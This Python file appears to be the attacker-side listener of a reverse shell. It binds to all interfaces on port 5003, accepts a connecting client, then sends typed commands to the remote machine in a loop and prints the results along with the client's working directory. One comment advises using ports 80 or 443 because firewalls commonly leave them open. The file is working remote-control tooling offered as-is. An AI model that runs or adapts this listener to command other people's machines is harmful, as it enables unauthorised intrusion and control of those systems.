import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003 #ephermal port number but we should use 80 or 443 as these are popularly opened
BUFFER_SIZE = 10224 * 128
SEPARATOR = "<sep>"

socket = socket.socket()

#bind socket to all IP addresses of this host
socket.bind((SERVER_HOST, SERVER_PORT))

#Listen for connections, 5 is the maximum number of connections supported
socket.listen(5)

#accept connections if there is any
client_socket, client_address = socket.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

#get working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)